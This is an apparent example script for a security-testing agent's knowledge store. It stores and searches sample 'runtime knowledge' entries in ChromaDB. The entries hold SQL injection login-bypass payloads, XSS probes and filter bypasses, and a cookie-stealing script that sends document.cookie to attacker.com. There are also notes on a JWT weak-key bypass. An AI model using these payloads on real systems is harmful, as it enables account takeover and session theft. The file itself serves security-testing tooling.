#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
动态知识存储示例 - 演示如何将 AI 运行时获得的知识存储到 ChromaDB

使用方法:
    python runtime_knowledge_example.py
"""

import asyncio
import sys
from pathlib import Path
from datetime import datetime

# 添加项目根目录到路径
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))

from deepagent.knowledge.router import KnowledgeRouter
from deepagent.knowledge.viking import VikingKnowledgeBackend


async def example_add_single_knowledge(router: KnowledgeRouter):
    """示例 1: 添加单条运行时知识"""
    print("\n" + "="*60)
    print("📝 示例 1: 添加单条运行时知识")
    print("="*60)
    
    # 模拟 AI 在运行时学到的知识
    knowledge = {
        "title": "SQL Injection in Login Form",
        "content": """
当发现登录表单存在 SQL 注入漏洞时，可以采用以下策略:

1. 使用经典 payload: ' OR '1'='1' --
2. 尝试联合查询：' UNION SELECT username, password FROM users --
3. 如果是 MySQL，可以使用：admin'-- 直接绕过

注意事项:
- 先使用 ' 测试是否存在注入点
- 观察错误信息判断注入类型
- 使用 sqlmap 等工具自动化测试
        """,
        "source": "ai_runtime_discovery",
        "created_by": "deep_agent_001",
        "severity": "high",
        "applicable_scenarios": ["authentication", "login_form", "sql_injection"],
    }
    
    doc_id = router.add_runtime_knowledge(
        knowledge=knowledge,
        category="experience"  # 存储到经验集合
    )
    
    if doc_id:
        print(f"✅ 成功添加知识，ID: {doc_id}")
    else:
        print("❌ 添加失败")
    
    return doc_id


async def example_add_ste_experience(router: KnowledgeRouter):
    """示例 2: 添加 STE (Strategy-Tactics-Example) 经验"""
    print("\n" + "="*60)
    print("📝 示例 2: 添加 STE 格式经验")
    print("="*60)
    
    ste_experience = {
        "title": "XSS 漏洞利用策略",
        "content": """
跨站脚本攻击 (XSS) 完整利用流程:

【战略原则】
利用用户输入未经过滤或转义不充分，在受害者浏览器中执行恶意脚本

【战术步骤】
1. 探测阶段
   - 测试所有用户输入点（表单、URL 参数、HTTP 头）
   - 使用 payload: <script>alert('XSS')</script>
   - 观察是否弹出警告框

2. 绕过阶段
   - 如果<script>被过滤，尝试<img src=x onerror=alert('XSS')>
   - 使用编码绕过：&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
   - 利用事件处理器：onmouseover, onfocus, onclick

3. 利用阶段
   - Cookie 窃取：<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
   - 钓鱼攻击：伪造登录表单
   - 键盘记录：监听键盘事件

4. 持久化阶段
   - 存储型 XSS：将恶意脚本注入数据库
   - DOM 型 XSS：修改页面 DOM 结构
        """,
        "strategy": "Client-side Code Injection",
        "tactics": [
            "Input Point Detection",
            "Filter Bypass",
            "Script Execution",
            "Data Exfiltration"
        ],
        "source": "ai_learning",
        "timestamp": datetime.now().isoformat(),
    }
    
    doc_id = router.add_runtime_knowledge(
        knowledge=ste_experience,
        category="experience"
    )
    
    if doc_id:
        print(f"✅ STE 经验已存储，ID: {doc_id}")
    else:
        print("❌ 存储失败")
    
    return doc_id


async def example_batch_add_knowledge(router: KnowledgeRouter):
    """示例 3: 批量添加运行时知识"""
    print("\n" + "="*60)
    print("📝 示例 3: 批量添加任务记忆")
    print("="*60)
    
    task_memories = [
        {
            "title": "API Rate Limiting Test",
            "content": "对 /api/login 端点进行速率限制测试，发送 100 个请求仅 3 个被拒绝，建议实施更严格的限流策略",
            "source": "automated_test",
            "type": "security_finding",
        },
        {
            "title": "Subdomain Enumeration Result",
            "content": "发现 3 个子域名：dev.example.com, staging.example.com, api.example.com，其中 dev 子域名暴露了调试信息",
            "source": "recon_tool",
            "type": "reconnaissance",
        },
        {
            "title": "JWT Token Analysis",
            "content": "捕获的 JWT token 使用 HS256 算法，尝试验证弱密钥成功，获取有效 token",
            "source": "manual_testing",
            "type": "authentication_bypass",
        },
    ]
    
    count = router.batch_add_runtime_knowledge(
        knowledge_list=task_memories,
        category="task_memory"
    )
    
    print(f"✅ 批量添加了 {count} 条任务记忆")
    return count


async def example_search_knowledge(router: KnowledgeRouter):
    """示例 4: 搜索已存储的知识"""
    print("\n" + "="*60)
    print("🔍 示例 4: 搜索运行时知识")
    print("="*60)
    
    # 搜索经验
    print("\n搜索 'SQL injection' 相关经验:")
    results = router.search(query="SQL injection", category="experience", limit=3)
    
    if results:
        for i, result in enumerate(results, 1):
            print(f"\n{i}. {result.get('title', 'Unknown')}")
            print(f"   来源：{result.get('metadata', {}).get('source', 'unknown')}")
            print(f"   内容预览：{result.get('content', '')[:100]}...")
    else:
        print("未找到相关结果")
    
    # 搜索任务记忆
    print("\n搜索 'API' 相关任务记忆:")
    results = router.search(query="API", category="task_memory", limit=3)
    
    if results:
        for i, result in enumerate(results, 1):
            print(f"\n{i}. {result.get('title', 'Unknown')}")
            print(f"   内容预览：{result.get('content', '')[:100]}...")
    else:
        print("未找到相关结果")


async def example_combined_search(router: KnowledgeRouter):
    """示例 5: 组合搜索（静态 + 动态）"""
    print("\n" + "="*60)
    print("🔍 示例 5: 组合搜索所有知识")
    print("="*60)
    
    results = router.search(query="XSS attack", limit=5)
    
    if results:
        print(f"\n找到 {len(results)} 条相关知识:")
        for i, result in enumerate(results, 1):
            print(f"\n{i}. [{result.get('type', 'unknown')}] {result.get('title', 'Unknown')}")
            print(f"   类别：{result.get('category', 'unknown')}")
            print(f"   来源：{result.get('metadata', {}).get('source', 'unknown')}")
    else:
        print("未找到相关结果")


async def main():
    """主函数"""
    print("\n" + "="*60)
    print("🚀 动态知识存储示例")
    print("="*60)
    
    # 初始化 OpenViking 后端（可选，用于静态知识搜索）
    viking_backend = VikingKnowledgeBackend()
    viking_backend.initialize()
    
    # 初始化 ChromaDB（用于动态知识）
    chroma_path = str(project_root / ".chroma_data")
    
    # 创建知识路由器
    router = KnowledgeRouter(
        viking_backend=viking_backend if viking_backend.is_available else None,
        chroma_path=chroma_path,
    )
    
    print("\n✅ 知识路由器初始化完成")
    print(f"  - OpenViking: {'可用' if viking_backend.is_available else '不可用'}")
    print(f"  - ChromaDB: 已初始化 ({chroma_path})")
    
    # 运行示例
    await example_add_single_knowledge(router)
    await example_add_ste_experience(router)
    await example_batch_add_knowledge(router)
    await example_search_knowledge(router)
    await example_combined_search(router)
    
    print("\n" + "="*60)
    print("✨ 所有示例运行完成!")
    print("="*60)
    print("\n💡 关键要点:")
    print("  1. 静态知识 (Payloads, HowToHunt) → OpenViking")
    print("  2. 动态知识 (经验、任务记忆) → ChromaDB")
    print("  3. KnowledgeRouter 提供统一的搜索接口")
    print("  4. 支持按类别路由和组合搜索")
    print()


if __name__ == "__main__":
    asyncio.run(main())
